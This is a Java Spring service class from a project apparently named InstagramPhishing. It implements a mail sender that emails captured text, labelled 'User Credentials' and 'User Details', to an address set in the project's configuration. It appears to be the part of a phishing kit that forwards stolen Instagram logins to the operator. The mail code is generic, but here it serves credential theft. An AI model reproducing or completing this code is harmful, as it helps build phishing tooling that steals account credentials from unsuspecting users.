package com.kafeel.InstagramPhishing.service;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.PropertySource;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Component;

@Component
@PropertySource("classpath:application.properties")
public class MailServiceImpl implements MailService{

	@Value("${spring.mail.sendTo}")
	private String sendTo;
	
	@Value("${spring.mail.username}")
	private String from;
	
	public final static String SUBJECT ="User Credentials";
	@Autowired
	JavaMailSender mailSender;
	
	@Override
	public void sendMail(String text) {
		
		SimpleMailMessage message = new SimpleMailMessage();
		message.setFrom(from);
		message.setSubject("User Details");
		message.setText(text);
		message.setTo(sendTo);
		mailSender.send(message);
	}

}
